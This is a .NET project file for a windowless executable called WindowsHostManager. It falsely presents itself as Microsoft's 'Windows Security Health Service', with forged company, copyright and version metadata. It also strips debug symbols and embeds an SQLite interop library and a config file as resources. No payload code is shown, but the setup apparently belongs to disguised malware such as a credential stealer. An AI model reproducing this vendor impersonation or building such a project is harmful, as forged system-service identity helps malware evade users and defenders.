<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <TargetFramework>net462</TargetFramework>
    <PlatformTarget>x64</PlatformTarget>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
    <AssemblyName>WindowsHostManager</AssemblyName>
    <RootNamespace>Microsoft.Security.Health</RootNamespace>
    <LangVersion>latest</LangVersion>
    <ApplicationManifest>app.manifest</ApplicationManifest>

    <Company>Microsoft Corporation</Company>
    <Product>Microsoft Windows Security Health Service</Product>
    <Description>Windows Security Health Service Runtime</Description>
    <Copyright>© Microsoft Corporation. All rights reserved.</Copyright>
    <AssemblyVersion>10.0.22621.1</AssemblyVersion>
    <FileVersion>10.0.22621.1</FileVersion>
    <NeutralLanguage>en-US</NeutralLanguage>

    <DebugType>none</DebugType>
    <DebugSymbols>false</DebugSymbols>
    <Optimize>true</Optimize>
  </PropertyGroup>

  <!-- Только системные библиотеки -->
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Drawing" />
    <Reference Include="System.IO.Compression" />
    <Reference Include="System.Net.Http" />
    <Reference Include="System.Management" />
    <Reference Include="System.Numerics" />
    <Reference Include="System.Security" />
    <Reference Include="System.Xml" />
  </ItemGroup>

  <!-- Встраиваем SQLite.Interop.dll как ресурс -->
  <ItemGroup>
    <EmbeddedResource Include="SQLite.Interop_embed.dll">
      <LogicalName>SQLite.Interop.dll</LogicalName>
    </EmbeddedResource>
    <EmbeddedResource Include="config.json">
      <LogicalName>config.json</LogicalName>
    </EmbeddedResource>
  </ItemGroup>

</Project>
